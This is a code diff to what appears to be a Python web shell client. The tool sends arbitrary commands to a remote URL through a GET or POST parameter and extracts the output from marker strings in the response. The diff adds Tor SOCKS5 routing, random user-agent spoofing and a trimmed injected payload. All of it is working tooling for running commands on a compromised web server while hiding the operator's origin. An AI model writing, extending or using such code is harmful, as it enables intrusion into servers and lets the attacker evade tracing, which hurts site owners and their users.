@@ -9,10 +9,11 @@ from core.libs.connect_handler import connect
 from core.libs.menu import getargs
 from core.libs.thirdparty.termcolor import colored
 from core.libs.thirdparty.termcolor import cprint
+from core.libs.thirdparty.socks import PROXY_TYPE_SOCKS5
+from core.libs.thirdparty.socksipyhandler import SocksiPyHandler
 
 import re
 import time
-
 
 USER_AGENTS = [
         "curl/7.7.2 (powerpc-apple-darwin6.0) libcurl 7.7.2 (OpenSSL 0.9.6b)",
@@ -46,6 +47,7 @@ class MakeRequest(object):
         self.proxy = getargs.proxy
         self.user_agent = getargs.agent
         self.random_agent = getargs.random_agent
+        self.tor = getargs.tor
 
     def get_page_source(self, cmd):
         self.cmd = cmd
@@ -60,6 +62,12 @@ class MakeRequest(object):
             proxy_support = ProxyHandler({'http': self.proxy} if self.proxy else {})
             opener = build_opener(proxy_support)
 
+            # Tor support
+            if self.tor:
+                opener = build_opener(SocksiPyHandler(PROXY_TYPE_SOCKS5, '127.0.0.1', 9050))
+                #print opener.open('http://ifconfig.me/ip').read()
+                #exit()
+
             # User angent
             if self.random_agent:
                 opener.addheaders = [('User-agent', USER_AGENTS[randint(0, len(USER_AGENTS) - 1)])]
@@ -70,15 +78,14 @@ class MakeRequest(object):
             install_opener(opener)
 
             errmsg = colored('\n[!] Check your network connection and/or the proxy (if you\'re using one)', 'red')
-            fourzerofourmsg = colored('\n[!] Please make sure the page (\'{0}\') requested exists!'.format(self.url), 'red')
 
             # Check if the method is POST
             if self.method == 'post' or self.parameter:
                 self.method = 'post'
-                parameters = urlencode({self.parameter: 'error_reporting(0);echo ::command_start::;' + self.cmd.strip(';') + ';echo ::command_end::;'})
+                parameters = urlencode({self.parameter: 'echo ::command_start::;' + self.cmd.strip(';') + ';echo ::command_end::;'})
                 try:
                     sc = map(str.rstrip, opener.open(self.url, parameters).readlines())
-                    sc =  '::command_deli::'.join(sc)
+                    sc = '::command_deli::'.join(sc)
                     sc = re.search('::command_start::(.+)::command_end::', sc)
                     if sc:
                         sc = sc.group(1).split('::command_deli::')[1:-1]
@@ -94,8 +101,8 @@ class MakeRequest(object):
             # If the used method set GET
             else:
                 try:
-                    sc = map(str.rstrip, opener.open('{0}{1}'.format(self.url, quote('error_reporting(0);echo ::command_start::;' +self.cmd.strip(';')+';echo ::command_end::;'))).readlines())
-                    sc =  '::command_deli::'.join(sc)
+                    sc = map(str.rstrip, opener.open('{0}{1}'.format(self.url, quote('echo ::command_start::;' + self.cmd.strip(';') + ';echo ::command_end::;'))).readlines())
+                    sc = '::command_deli::'.join(sc)
                     sc = re.search('::command_start::(.+)::command_end::', sc)
                     if sc:
                         sc = sc.group(1).split('::command_deli::')[1:-1]
